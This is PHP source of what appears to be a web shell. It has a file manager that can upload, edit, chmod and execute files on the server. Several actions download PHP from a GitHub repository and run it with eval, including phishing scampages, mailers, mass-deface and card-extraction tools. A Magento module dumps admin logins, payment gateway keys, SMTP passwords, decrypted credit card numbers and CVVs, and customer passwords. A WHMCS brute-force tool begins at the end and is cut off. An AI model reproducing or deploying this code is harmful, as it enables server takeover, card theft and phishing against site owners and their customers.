if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {
	$dir = relative2absolute($dir, $_POST['olddir']);
}

$directory = simplify_path(addslash($dir));

$files = array();
$action = '';
if (!empty($_POST['submit_all'])) {
	$action = $_POST['action_all'];
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("checked$i", $_POST) && $_POST["checked$i"] == 'true') {
			$files[] = $_POST["file$i"];
		}
	}
} elseif (!empty($_REQUEST['action'])) {
	$action = $_REQUEST['action'];
	$files[] = relative2absolute($_REQUEST['file'], $directory);
} elseif (!empty($_POST['submit_upload']) && !empty($_FILES['upload']['name'])) {
	$files[] = $_FILES['upload'];
	$action = 'upload';
} elseif (array_key_exists('num', $_POST)) {
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("submit$i", $_POST)) break;
	}
	if ($i < $_POST['num']) {
		$action = $_POST["action$i"];
		$files[] = $_POST["file$i"];
	}
}
if (empty($action) && (!empty($_POST['submit_create']) || (array_key_exists('focus', $_POST) && $_POST['focus'] == 'create')) && !empty($_POST['create_name'])) {
	$files[] = relative2absolute($_POST['create_name'], $directory);
	switch ($_POST['create_type']) {
	case 'directory':
		$action = 'create_directory';
		break;
	case 'file':
		$action = 'create_file';
	}
}
if (sizeof($files) == 0) $action = ''; else $file = reset($files);

if ($lang == 'auto') {
	if (array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER) && strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) >= 2) {
		$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	} else {
		$lang = 'en';
	}
}
$words = getwords($lang);
$cols = ($win) ? 4 : 7;
if (!isset($dirpermission)) {
	$dirpermission = (function_exists('umask')) ? (0777 & ~umask()) : 0755;
}
if (!isset($filepermission)) {
	$filepermission = (function_exists('umask')) ? (0666 & ~umask()) : 0644;
}
if (!empty($_SERVER['SCRIPT_NAME'])) {
	$self = html(basename($_SERVER['SCRIPT_NAME']));
} elseif (!empty($_SERVER['PHP_SELF'])) {
	$self = html(basename($_SERVER['PHP_SELF']));
} else {
	$self = '';
}
if (!empty($_SERVER['SERVER_SOFTWARE'])) {
	if (strtolower(substr($_SERVER['SERVER_SOFTWARE'], 0, 6)) == 'apache') {
		$apache = true;
	} else {
		$apache = false;
	}
} else {
	$apache = true;
}
switch ($action) {
case 'view':
	if (is_script($file)) {
		ob_start();
		highlight_file($file);
		$src = ereg_replace('<font color="([^"]*)">', '<span style="color: \1">', ob_get_contents());
		$src = str_replace(array('</font>', "\r", "\n"), array('</span>', '', ''), $src);
		ob_end_clean();
		html_header();
		echo '<h2 style="text-align: left; margin-bottom: 0">' . html($file) . '</h2>
<hr />
<table>
<tr>
<td style="text-align: right; vertical-align: top; color: gray; padding-right: 3pt; border-right: 1px solid gray">
<pre style="margin-top: 0"><code>';
		for ($i = 1; $i <= sizeof(file($file)); $i++) echo "$i\n";
		echo '</code></pre>
</td>
<td style="text-align: left; vertical-align: top; padding-left: 3pt">
<pre style="margin-top: 0">' . $src . '</pre>
</td>
</tr>
</table>
';
		html_footer();
	} else {
		echo '<textarea name="code" cols="150" rows="50" wrap="VIRTUAL" >';
		readfile($file);
	}
	break;
case 'download':
	header('Pragma: public');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Content-Type: ' . getmimetype($file));
	header('Content-Disposition: attachment; filename=' . basename($file) . ';');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	break;
case 'upload':
	$dest = relative2absolute($file['name'], $directory);
	if (@file_exists($dest)) {
		listing_page(error('already_exists', $dest));
	} elseif (@move_uploaded_file($file['tmp_name'], $dest)) {
		listing_page(notice('uploaded', $file['name']));
	} else {
		listing_page(error('not_uploaded', $file['name']));
	}
	break;
case 'create_directory':
	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$dirpermission);
		if (@mkdir($file, $dirpermission)) {
			listing_page(notice('created', $file));
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}
	break;
case 'create_file':
	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$filepermission);
		if (@touch($file)) {
			edit($file);
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}
	break;
case 'execute':
	chdir(dirname($file));
	$output = array();
	$retval = 0;
	exec('echo "./' . basename($file) . '" | /bin/sh', $output, $retval);
	$error = ($retval == 0) ? false : true;
	if (sizeof($output) == 0) $output = array('<' . $words['no_output'] . '>');
	if ($error) {
		listing_page(error('not_executed', $file, implode("\n", $output)));
	} else {
		listing_page(notice('executed', $file, implode("\n", $output)));
	}
	break;
case 'delete':
	if (!empty($_POST['no'])) {
		listing_page();
	} elseif (!empty($_POST['yes'])) {
		$failure = array();
		$success = array();
		foreach ($files as $file) {
			if (del($file)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}
		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_deleted', implode("\n", $failure));
		}
		if (sizeof($success) > 0) {
			$message .= notice('deleted', implode("\n", $success));
		}
		listing_page($message);
	} else {
		html_header();
		echo '<form action="' . $self . '?do=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';
		request_dump();
		echo "\t<b>" . word('really_delete') . '</b>
	<p>
';
		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}
		echo '	</p>
	<hr />
	<input type="submit" name="no" value="' . word('no') . '" id="red_button" />
	<input type="submit" name="yes" value="' . word('yes') . '" id="green_button" style="margin-left: 50px" />
</td>
</tr>
</table>
</form>
';
		html_footer();
	}
	break;
case 'rename':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		if (!@file_exists($dest) && @rename($file, $dest)) {
			listing_page(notice('renamed', $file, $dest));
		} else {
			listing_page(error('not_renamed', $file, $dest));
		}
	} else {
		$name = basename($file);
		html_header();
		echo '<form action="' . $self . '?do=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
	<input type="hidden" name="action" value="rename" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<b>' . word('rename_file') . '</b>
	<p>' . html($file) . '</p>
	<b>' . substr($file, 0, strlen($file) - strlen($name)) . '</b>
	<input type="text" name="destination" size="' . textfieldsize($name) . '" value="' . html($name) . '" />
	<hr />
	<input type="submit" value="' . word('rename') . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?do=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'move':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		$failure = array();
		$success = array();
		foreach ($files as $file) {
			$filename = substr($file, strlen($directory));
			$d = $dest . $filename;
			if (!@file_exists($d) && @rename($file, $d)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}
		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_moved', implode("\n", $failure), $dest);
		}
		if (sizeof($success) > 0) {
			$message .= notice('moved', implode("\n", $success), $dest);
		}
		listing_page($message);
	} else {
		html_header();
		echo '<form action="' . $self . '?do=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';
		request_dump();
		echo "\t<b>" . word('move_files') . '</b>
	<p>
';
		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}
		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('move') . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?do=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'copy':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		if (@is_dir($dest)) {
			$failure = array();
			$success = array();
			foreach ($files as $file) {
				$filename = substr($file, strlen($directory));
				$d = addslash($dest) . $filename;
				if (!@is_dir($file) && !@file_exists($d) && @copy($file, $d)) {
					$success[] = $file;
				} else {
					$failure[] = $file;
				}
			}
			$message = '';
			if (sizeof($failure) > 0) {
				$message = error('not_copied', implode("\n", $failure), $dest);
			}
			if (sizeof($success) > 0) {
				$message .= notice('copied', implode("\n", $success), $dest);
			}
			listing_page($message);
		} else {
			if (!@file_exists($dest) && @copy($file, $dest)) {
				listing_page(notice('copied', $file, $dest));
			} else {
				listing_page(error('not_copied', $file, $dest));
			}
		}
	} else {
		html_header();
		echo '<form action="' . $self . '?do=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';
		request_dump();
		echo "\n<b>" . word('copy_files') . '</b>
	<p>
';
		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}
		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('copy') . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?do=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'create_symlink':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		if (substr($dest, -1, 1) == $delim) $dest .= basename($file);
		if (!empty($_POST['relative'])) $file = absolute2relative(addslash(dirname($dest)), $file);
		if (!@file_exists($dest) && @symlink($file, $dest)) {
			listing_page(notice('symlinked', $file, $dest));
		} else {
			listing_page(error('not_symlinked', $file, $dest));
		}
	} else {
		html_header();
		echo '<form action="' . $self . '?do=Files" method="post">
<table class="dialog" id="symlink">
<tr>
	<td style="vertical-align: top">' . word('destination') . ': </td>
	<td>
		<b>' . html($file) . '</b><br />
		<input type="checkbox" name="relative" value="yes" id="checkbox_relative" checked="checked" style="margin-top: 1ex" />
		<label for="checkbox_relative">' . word('relative') . '</label>
		<input type="hidden" name="action" value="create_symlink" />
		<input type="hidden" name="file" value="' . html($file) . '" />
		<input type="hidden" name="dir" value="' . html($directory) . '" />
	</td>
</tr>
<tr>
	<td>' . word('symlink') . ': </td>
	<td>
		<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
		<input type="submit" value="' . word('create_symlink') . '" />
	</td>
</tr>
</table>
<p><a href="' . $self . '?do=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'edit':
	if (!empty($_POST['save'])) {
		$content = str_replace("\r\n", "\n", $_POST['content']);
		if (($f = @fopen($file, 'w')) && @fwrite($f, $content) !== false && @fclose($f)) {
			listing_page(notice('saved', $file));
		} else {
			listing_page(error('not_saved', $file));
		}
	} else {
		if (@is_readable($file) && @is_writable($file)) {
			edit($file);
		} else {
			listing_page(error('not_edited', $file));
		}
	}
	break;
case 'permission':
	if (!empty($_POST['set'])) {
		$mode = 0;
		if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;
		if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;
		if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;

		if (@chmod($file, $mode)) {
			listing_page(notice('permission_set', $file, decoct($mode)));
		} else {
			listing_page(error('permission_not_set', $file, decoct($mode)));
		}
	} else {
		html_header();
		$mode = fileperms($file);
		echo '<form action="' . $self . '?do=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
	<p style="margin: 0">' . phrase('permission_for', $file) . '</p>
	<hr />
	<table id="permission">
	<tr>
		<td></td>
		<td style="border-right: 1px solid black">' . word('owner') . '</td>
		<td style="border-right: 1px solid black">' . word('group') . '</td>
		<td>' . word('other') . '</td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('read') . ':</td>
		<td><input type="checkbox" name="ur" value="1"'; if ($mode & 00400) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gr" value="1"'; if ($mode & 00040) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="or" value="1"'; if ($mode & 00004) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('write') . ':</td>
		<td><input type="checkbox" name="uw" value="1"'; if ($mode & 00200) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gw" value="1"'; if ($mode & 00020) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ow" value="1"'; if ($mode & 00002) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('execute') . ':</td>
		<td><input type="checkbox" name="ux" value="1"'; if ($mode & 00100) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gx" value="1"'; if ($mode & 00010) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ox" value="1"'; if ($mode & 00001) echo ' checked="checked"'; echo ' /></td>
	</tr>
	</table>
	<hr />
	<input type="submit" name="set" value="' . word('set') . '" />
	<input type="hidden" name="action" value="permission" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?do=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
default:
	listing_page();
}

exit;
}
 





//unzip Scampage Apple //
if($_GET['do'] == 'ExApL')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/w465wstezdxgz5esrfgdtgfh.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//unzip api //

if($_GET['do'] == 'ExAp')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/3t32werfeeehr56y5ty.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Magento Grab DB //
if($_GET['do'] == 'MaG')
{

@set_time_limit(0);
echo'<body bgcolor="#ffffff" >
<center>
<br>
<FORM action=""  method="post">
<input type="hidden" name="form_action" value="2">
</div>
</div>
';
if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){
	$xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
    if(isset($xml->global->resources->default_setup->connection)) {
       $connection = $xml->global->resources->default_setup->connection;
       $prefix = $xml->global->resources->db->table_prefix;
	   $key = $xml->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';
       
       try {
           $app = Mage::app('default');
           Mage::getSingleton('core/session', array('name'=>'frontend'));
       }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";}

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){
           print("Could not connect: " . mysql_error());
       }
       mysql_select_db($connection->dbname);
	   echo'<center>============================[    PHP MyAdmin    ]============================<br><br></center>';
       echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."| $prefix | $key<br/>\n";

	$crypto = new Varien_Crypt_Mcrypt();
    $crypto->init($key);

	//=========================================================================================================
	$query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");
	if (!$query){
          echo "<center><b>Gagal</b></center>";
    }else{
			$site = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'"));
          echo'<center><br><br>
		        ====================================================================<br>
                                [ Admin FROM website : '.$site['website'].'] <br>
                ====================================================================<br></center>';
    }
	echo "
	<table border='1' align='center' >
	<tr>
	<td>id</td>
	<td>firstname</td>
	<td>lastname</td>
	<td>email</td>
	<td>username</td>
	<td>password</td>
	</tr>";
		while($vx = mysql_fetch_array($query)) {
		$no = 1;
		$user_id = $vx['user_id'];
		$username = $vx['username'];
		$password = $vx['password'];
		$email = $vx['email'];
		$firstname = $vx['firstname'];
		$lastname = $vx['lastname'];
		echo "<tr><pre><td>$user_id</td><td>$firstname</td><td>$lastname</td><td>$email</td><td>$username</td><td>$password</td></pre></tr>";
		} 
	echo "</table><br>";
	//=========================================================================================================
	$query = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'");
	if(mysql_num_rows($query) != 0){
		if (!$query){
			  echo "<center><b>Gagal</b></center>";
		}else{
			  echo'<center><br><br>
					====================================================================<br>
									[ Authorizenet ] <br>
					====================================================================<br></center>';
		}
		echo "
		<table border='1' align='center' >
		<tr>
		<td>no</td>
		<td>user</td>
		<td>pass</td>	
		</tr>";
			$no = 1;
			while($vx = mysql_fetch_array($query)) {
			$user = $crypto->decrypt($vx['user']);
			$pass = $crypto->decrypt($vx['pass']);

			
			echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";
			$no++;
			} 
		echo "</table><br>";
	}
	//=========================================================================================================
	$query_smtp = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1");
	if(mysql_num_rows($query_smtp) != 0){
		if (!$query_smtp){
			  echo "<center><b>Gagal</b></center>";
		}else{
			  echo'<center><br><br>
					====================================================================<br>
									[ SMTP ] <br>
					====================================================================<br></center>';
		}
		echo "
		<table border='1' align='center' >
		<tr>
		<td>no</td>
		<td>host</td>		
		<td>port</td>
		<td>user</td>
		<td>pass</td>	
		</tr>";
			$no = 1;
			$batas = 0;
			while($rows = mysql_fetch_array($query_smtp)) {
				$smtphost = $rows[0];
				$smtpport = $rows[1];
				$smtpuser = $rows[2];
				$smtppass = $rows[3];
				echo "<tr><pre><td>$no</td><td>$smtphost</td><td>$smtpport</td><td>$smtpuser</td><td>$smtppass</td></pre></tr>";
				$no++;
			}
		echo "</table><br>";
	}
	//=========================================================================================================
	$query = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");
	$query2 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
	if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0){
          echo'<center><br><br>
		        ====================================================================<br>
                                [ Credit Card ] <br>
                ====================================================================<br></center>';
			echo "
			<table border='1' align='left' >
			<tr>
			<td>no</td>
			<td>Date</td>
			<td>Credit Owner</td>
			<td>method</td>
			<td>Credit Number</td>
			<td>Credit Exp</td>
			<td>CVV</td>
			<td>Address</td>
			</tr>";
				$no = 1;
				$batas = 0;
				while($vx = mysql_fetch_array($query)){
				$date = $vx['updated_at'];
				$cc_owner = $vx['cc_owner'];
				$method = $vx['method'];
				$cc_number_enc = $crypto->decrypt($vx['cc_number_enc']);
				$exp = $vx['exp'];		
				$cc_cid_enc = $crypto->decrypt($vx['cc_cid_enc']);	
				$Billing_Address = $vx['Billing Address'];
				echo "<tr><pre><td>$no</td><td>$date</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_enc</td><td>$Billing_Address</td></pre></tr>";
				$batas = $no++;
				}
				
				while($vx2 = mysql_fetch_array($query2)){
					$batas +=1;
				$cc_owner = $vx2['cc_owner'];
				$method = $vx2['method'];
				$cc_number_enc = $crypto->decrypt($vx2['cc_number_enc']);
				$exp = $vx2['exp'];		
				$cc_cid_status = $crypto->decrypt($vx2['cc_cid_status']);
				$Billing_Address = $vx2['Billing Address'];
				echo "<tr><pre><td>$batas</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_status</td><td>$Billing_Address</td></pre></tr>";
				 $batas++;
				}	 
				
			echo "</table><br>";	
	}
	//=========================================================================================================
	$query = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12");
	$query2 = mysql_query("SELECT customer_email,password_hash FROM sales_flat_quote");
	
	
	if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0 ){
		if (!$query){
			  echo "<center><b>Gagal</b></center>";
		}else{
			  echo'<center><br><br>
					====================================================================<br>
									[ Customer ] <br>
					====================================================================<br></center>';
		}
		echo "
		<table border='1' align='center' >
		<tr>
		<td>no</td>
		<td>user</td>
		<td>pass</td>	
		</tr>";
			$no = 1;
			$batas = 0;
			while($vx = mysql_fetch_array($query)) {
				$user = $vx['email'];
				$pass = $vx['value'];
				echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";
				$batas = $no++;
			} 
			
			if(mysql_num_rows($query2) != 0 && ($query2)){
				while($vx2 = mysql_fetch_array($query2)){
					$user = $vx2['customer_email'];
					$pass = $crypto->decrypt($vx2['password_hash']);
					if(!empty($user) && !empty($pass)){ //tampilin ketika datanya itu ada klo gk ada ya jangan di tampiin 
					    $batas +=1;
						echo "<tr><pre><td>$batas</td><td>$user</td><td>$pass</td></pre></tr>";
						$batas++;
					}
				}				
			}
		
		echo "</table><br>";
	}
	//=========================================================================================================
  }
}
function save($format,$data){
	$fp = fopen($format, 'a');
	fwrite($fp, $data);
	fclose($fp);
}
function cekbase64($string){ 
        $decoded = base64_decode($string, true);
        if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) return false;
        if(!base64_decode($string, true)) return false;
        if(base64_encode($decoded) != $string) return false;
        return true;//nilai return 1 jika true
    }
//----untuk decode password ---/
class Varien_Crypt_Mcrypt{
    /**
     * Constuctor
     *
     * @param array $data
     */
    public function __construct()
    {
    }

    /**
     * Initialize mcrypt module
     *
     * @param string $key cipher private key
     * @return Varien_Crypt_Mcrypt
     */
    public function init($key)
    {
        $this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');
        $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);
        $maxKeySize = mcrypt_enc_get_key_size($this->handler);

        if (iconv_strlen($key, 'UTF-8')>$maxKeySize) {
            //throw new Varien_Exception('Maximum key size must should be smaller '.$maxKeySize);
            return null;
        }

        mcrypt_generic_init($this->handler, $key, $iv);

        return $this;
    }

    /**
     * Encrypt data
     *
     * @param string $data source string
     * @return string
     */
    public function encrypt($data)
    {
        if (!$this->handler) {
            //throw new Varien_Exception('Crypt module is not initialized.');
            return null;
        }
        if (strlen($data) == 0) {
            return $data;
        }
        return base64_encode(mcrypt_generic($this->handler, $data));
    }

    /**
     * Decrypt data
     *
     * @param string $data encrypted string
     * @return string
     */
    public function decrypt($data)
    {
        if (!$this->handler) {
            //throw new Varien_Exception('Crypt module is not initialized.');
            return null;
        }
        if (strlen($data) == 0) {
            return $data;
        }
        return mdecrypt_generic($this->handler, base64_decode($data));
    }
	    
 
    /**
     * Desctruct cipher module
     *
     */
    public function __destruct()
    {
        if ($this->handler) {
            $this->_reset();
        }
    }

    protected function _reset()
    {
        mcrypt_generic_deinit($this->handler);
        mcrypt_module_close($this->handler);
    }
}


exit;
}

//Uploader Unzip //
if($_GET['do'] == 'UaeZ')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/ewtszdgsgdsdsgfjhgh.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Cpanel Croot //
if($_GET['do'] == 'CpC')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/pentil.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//PhpMailer2016 //
if($_GET['do'] == 'SmpK')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/sempak.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//PHP Mailer //
if($_GET['do'] == 'M')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/fuasghdkclsajdkiashbdksamnf.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Extrap CC //
if($_GET['do'] == 'ExTrPCc')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/7ryqoioaiwjizsuh%5Bq9ueraidkd3XtR4p4c35.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Rooting Mass Deface //
if($_GET['do'] == 'RmDs')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/53278798366rmd.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Scaner Plugin WP Joomla //
if($_GET['do'] == 'SwPJmPL')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/ad432141asdfsdj%20wpjmbrt.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Decode CC  //
if($_GET['do'] == 'DdCc')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/63y5w6789tuyfiuxtydcfczgdxthgfsCr4xD3C0dCC586.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}

//Pemisah Email Domain //
if($_GET['do'] == 'PmE')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/exd.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Scampage Apple //
if($_GET['do'] == 'scmpg')
{

$AppleID = "https://github.com/antoniola/rejeki/blob/master/AppleID.zip?raw=true";
$file = file_get_contents($AppleID);
$open = fopen("AppleID.zip" , 'w');
fwrite($open,$file);
fclose($open);
chmod ("AppleID.zip" , 0755);
echo '<font color =\'lime\'>Berhasil Menghinstall Scampage Apple<br>';
exit;
}
//Email Extractor//
if($_GET['do'] == 'ExE')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/email.html";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//UserDomains //
if($_GET['do'] == 'UdMs')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/udm.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//Extrac Apple Dan Api //
if($_GET['do'] == 'extract')
{
	
$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/wtesdfgh43534766frdrtgf.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}

//Install Api CCheker //
if($_GET['do'] == 'installtmp')

{
$tmp = "https://github.com/antoniola/jancok/blob/master/tmp.zip?raw=true";
$file = file_get_contents($tmp);
$open = fopen("tmp.zip" , 'w');
fwrite($open,$file);
fclose($open);
chmod ("tmp.zip" , 0755);
echo '<font color =\'lime\'>Berhasil Menghinstall Api <br>';
exit;
}
//WHM brute force //
if($_GET['do'] == 'Whmcz211') {
echo "<html><head><link rel=\"SHORTCUT ICON\" href=\"http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif\"><title> >-|I|-> HsH 2011 <-|I|-< </title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"><style> body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px } A:link {text-decoration: none;color: aqua;} A:active {text-decoration: none;color: aqua;} A:visited {text-decoration: none;color: lime;} A:hover {text-decoration: underline; color: Fuchsia;} #new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;} input:hover,tr:hover,td:hover{background-color:  ; color: aqua;} </style><style type=\"text/css\"></style><style type=\"text/css\"></style></head><center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
echo "<textarea rows='15' cols='45' name=\"site\">http://target.com/admin/</textarea>\n"; 
echo "<textarea rows='15' cols='30' name=\"user\">admin \n"; 
echo "demo\n"; 
echo "admin123\n"; 
echo "</textarea><textarea rows='15' cols='30' name=\"pass\">\n"; 
echo "admin\n"; 
echo "123456\n"; 
echo "password\n"; 
echo "102030\n"; 
echo "HsH1337\n"; 
echo "12345\n"; 
echo "123456789\n"; 
echo "pass\n"; 
echo "test\n"; 
echo "admin123\n"; 
echo "demo\n"; 
echo "!@#$%^\n"; 
echo "</textarea><br><input type=\"submit\" name='start' value=\" [ P L A Y ] \" /></form></center>\n";
 set_time_limit(0); 
    error_reporting(0); 
    @apache_setenv('no-gzip', 1); 
    @ini_set('zlib.output_compression', 0); 
    @ini_set('implicit_flush', 1); 
    for($i=0;$i<= ob_get_level(); $i++) 
    { 
        ob_end_flush(); 
    } 
    ob_implicit_flush(1); 
 function check_ip($ip) { 
    if ((!empty($ip) && ip2long($ip) != 0 - 1) && ip2long($ip) != false) { 
